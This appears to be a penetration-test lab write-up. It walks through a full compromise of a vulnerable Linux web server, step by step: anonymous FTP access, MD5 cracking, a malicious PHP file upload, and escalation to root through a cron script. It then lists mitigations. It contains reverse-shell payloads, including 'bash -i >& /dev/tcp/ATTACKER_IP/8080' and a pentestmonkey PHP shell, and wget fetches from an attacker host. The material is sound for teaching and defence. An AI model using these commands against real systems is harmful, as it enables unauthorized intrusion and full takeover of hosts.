# Multi-Stage Web Application Exploitation & Privilege Escalation

## Overview

This project demonstrates a **multi-stage penetration test** against a vulnerable Linux-based web server.  
The engagement involved identifying an **anonymous FTP misconfiguration**, extracting sensitive credentials, exploiting a **file upload vulnerability** to gain remote access, and ultimately performing **privilege escalation to root**.

The attack chain included:

1. Network reconnaissance
2. FTP misconfiguration discovery
3. Credential harvesting and password cracking
4. Web directory enumeration
5. Exploitation via malicious file upload
6. Reverse shell access
7. Privilege escalation through a vulnerable scheduled script

This lab demonstrates a complete **end-to-end compromise of a web application and underlying host system**.

---

# Objectives

This project demonstrates the ability to:

- Perform **network reconnaissance and service enumeration**
- Identify **misconfigured FTP services**
- Extract and analyze sensitive information
- **Crack password hashes**
- Conduct **web directory brute-forcing**
- Exploit **file upload vulnerabilities**
- Establish **reverse shells**
- Perform **Linux privilege escalation**
- Analyze scheduled processes for escalation opportunities

---

# Environment / Lab Setup

| Component | Details |
|----------|--------|
| Attacker Machine | Kali Linux |
| Target Machine | Vulnerable Linux Web Server |
| Target IP Address | `192.168.88.133` |
| Network | Local lab network |
| Web Server | Apache |
| Services Observed | FTP, HTTP |

---

# Methodology

## 1. Network Reconnaissance

The engagement began by identifying open services on the target using **Nmap**.

### Command Used

```bash
nmap -T4 -A 192.168.88.133
```

### Key Findings

- **Port 21 (FTP) open**
- Anonymous FTP login **allowed**
- A file named **note.txt** present on the FTP share

This misconfiguration allowed unauthenticated users to access files stored on the server.

---

# 2. FTP Enumeration

An FTP session was initiated using **anonymous login**.

```bash
ftp 192.168.88.133
```

Login credentials used:

```
Username: anonymous
Password: anonymous
```

The connection was successful, and the file **note.txt** was downloaded.

```bash
get note.txt
```

---

# 3. Sensitive Information Disclosure

The contents of the file revealed sensitive information related to a student account, including:

- Student **registration number**
- **Password hash**
- Information indicating that the **registration number is used as the login ID**

This information provided a potential path to authenticate to a web application.

---

# 4. Hash Identification

The hash was analyzed using Kali Linux's **hash-identifier** tool.

```bash
hash-identifier
```

The tool identified the hash as:

```
MD5
```

---

# 5. Password Cracking

The hash was submitted to an online cracking database.

Tool used:

```
https://crackstation.net
```

The hash was successfully cracked.

| Hash Type | Cracked Password |
|----------|----------------|
| MD5 | `student` |

At this stage the following credentials were obtained:

| Field | Value |
|-----|------|
| Username | Student Registration Number |
| Password | `student` |

However, the relevant login portal still needed to be identified.

---

# 6. Web Directory Enumeration

To locate hidden directories on the web server, **FFUF** was used for directory brute-forcing.

### Command Used

```bash
ffuf -u http://192.168.88.133/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### Discovered Directories

| Directory | Description |
|----------|-------------|
| `/academy` | Web application |
| `/phpmyadmin` | Database management interface |
| `/server-status` | Apache status page |

The **academy** directory appeared to contain the primary web application.

---

# 7. Web Application Access

Navigating to:

```
http://192.168.88.133/academy
```

The previously obtained credentials were used to log in.

The login was successful, granting access to the **student account portal**.

---

# 8. File Upload Vulnerability

While exploring the application, a **student profile page** was identified that allowed users to **upload a profile photo**.

This functionality presented a potential opportunity to upload a **malicious file**.

Because the site was running **Apache with PHP**, a PHP reverse shell was used.

---

# 9. Reverse Shell Payload

The reverse shell used:

```
https://github.com/pentestmonkey/php-reverse-shell
```

The payload was modified to include the attacker's IP address and listener port.

Example configuration:

```php
$ip = 'ATTACKER_IP';
$port = 1234;
```

---

# 10. Listener Setup

A Netcat listener was started on the attacker machine.

```bash
nc -lvnp 1234
```

---

# 11. Exploiting File Upload

After uploading the malicious PHP file and triggering it via the browser, a **reverse shell connection** was received.

Shell obtained:

```
www-data
```

This confirmed **remote command execution on the server**.

---

# 12. Privilege Escalation Enumeration

To identify privilege escalation opportunities, **LinPEAS** was used.

Tool used:

```
https://github.com/peass-ng/PEASS-ng
```

### Hosting LinPEAS

A simple web server was started on the attacker machine.

```bash
python3 -m http.server 8000
```

---

### Downloading LinPEAS on Target

From the reverse shell:

```bash
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

# 13. LinPEAS Findings

LinPEAS revealed:

- A script named **backup.sh**
- Located in the directory associated with the **grimmie** user
- Potential **credential exposure**

---

# 14. User Enumeration

The system users were listed using:

```bash
cat /etc/passwd
```

The user **grimmie** appeared relevant because the script was located in that user's directory.

---

# 15. SSH Access

Using the credentials discovered during enumeration, SSH access was attempted.

```bash
ssh grimmie@192.168.88.133
```

The login was successful, granting a shell as:

```
grimmie
```

---

# 16. Investigating backup.sh

The script contents:

```bash
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
```

The script creates a backup archive of the web application's include directory.

---

# 17. Scheduled Process Investigation

The script did not appear in normal cron listings, so **pspy** was used to monitor system processes.

Tool used:

```
https://github.com/DominicBreuker/pspy
```

---

### Running pspy

After transferring and executing the tool, it revealed that:

- `backup.sh` was executed **approximately once per minute**
- The script appeared to be executed by the **root user**

This presented a **privilege escalation opportunity**.

---

# 18. Privilege Escalation

The `backup.sh` script was modified to include a **bash reverse shell payload**.

Payload used:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/8080 0>&1
```

---

# Listener Setup

A Netcat listener was started on the attacker machine.

```bash
nc -lvnp 8080
```

Within approximately one minute, the scheduled script executed and triggered the reverse shell.

The connection returned:

```
root
```

This confirmed **successful privilege escalation to root**.

---

# Tools Used

| Tool | Purpose |
|-----|------|
| Nmap | Network scanning and service discovery |
| FTP | File transfer and enumeration |
| Hash-Identifier | Hash analysis |
| CrackStation | Password hash cracking |
| FFUF | Web directory brute forcing |
| Netcat | Reverse shell listener |
| PentestMonkey PHP Reverse Shell | Remote code execution payload |
| LinPEAS | Linux privilege escalation enumeration |
| pspy | Monitoring scheduled processes |

---

# Key Findings

| Vulnerability | Description | Severity |
|---------------|------------|----------|
| Anonymous FTP Access | Unauthenticated users can access server files | High |
| Sensitive Information Disclosure | Credentials stored in publicly accessible file | High |
| Weak Password | Password easily cracked from MD5 hash | Medium |
| File Upload Vulnerability | Arbitrary file upload leading to RCE | Critical |
| Insecure Scheduled Script | Root process executing user-writable script | Critical |

---

# Attack Chain Summary

| Stage | Action |
|------|------|
| 1 | Nmap scan discovered FTP service |
| 2 | Anonymous FTP login allowed file download |
| 3 | Sensitive credentials discovered in note.txt |
| 4 | Password hash identified as MD5 |
| 5 | Hash cracked to reveal password |
| 6 | FFUF discovered hidden web directories |
| 7 | Credentials used to access web application |
| 8 | File upload vulnerability exploited |
| 9 | Reverse shell obtained as `www-data` |
| 10 | LinPEAS identified privilege escalation vector |
| 11 | SSH access gained as `grimmie` |
| 12 | Root scheduled script discovered |
| 13 | Script modified with reverse shell |
| 14 | Root access obtained |

---

# Mitigation / Recommendations

To prevent similar attacks, the following security measures should be implemented.

## Disable Anonymous FTP Access

Anonymous FTP should be disabled unless absolutely necessary.

---

## Avoid Storing Sensitive Information in Public Locations

Sensitive data such as **password hashes or login instructions** should never be stored in publicly accessible directories.

---

## Enforce Strong Password Policies

Passwords should be complex and resistant to brute-force or dictionary attacks.

---

## Secure File Upload Mechanisms

Upload functionality should implement:

- File type validation
- File extension filtering
- Malware scanning
- Storage outside the web root

---

## Restrict Script Permissions

Scripts executed by privileged users should **not be writable by lower-privileged users**.

---

## Monitor Scheduled Tasks

Regular audits of cron jobs and scheduled scripts should be conducted to ensure they cannot be abused.

---

# Skills Demonstrated

This project demonstrates the following offensive security skills:

- Network reconnaissance
- Service enumeration
- FTP exploitation
- Credential harvesting
- Password cracking
- Web application exploitation
- Reverse shell deployment
- Linux enumeration
- Privilege escalation techniques
- Scheduled task abuse
- Full attack chain execution

---

# Key Takeaways

This project demonstrates a **complete compromise of a vulnerable web server**, progressing from **initial service discovery to full root access**.

It highlights several common security failures:

- Misconfigured services
- Sensitive information disclosure
- Weak password practices
- Insecure file upload functionality
- Poor privilege separation in scheduled tasks

The exercise showcases practical penetration testing skills across **network exploitation, web application attacks, and Linux privilege escalation**, which are critical competencies for offensive security professionals.
